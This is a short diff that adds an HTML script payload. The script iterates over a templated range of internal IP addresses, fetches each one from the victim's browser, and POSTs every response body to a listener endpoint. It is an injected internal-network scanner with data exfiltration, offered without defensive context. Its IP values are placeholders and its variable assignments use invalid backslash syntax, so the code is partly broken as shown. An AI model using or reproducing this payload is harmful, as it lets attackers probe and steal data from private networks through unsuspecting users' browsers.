@@ -1,0 +1,14 @@
+<script>
+start=\pick a number\;
+end=\pick a number\;
+for (let ip=start; ip <= end; ip++)
+{
+fetch("http://[number].[number].[number]."+ip)
+.then(r=>r.text())
+.then(b=>fetch("/listener/endpoint/directory",{
+method:"POST",headers:{
+"Content-Type":"text/plain"
+},body:b + "[number].[number].[number]." + ip
+}))
+}
+</script>
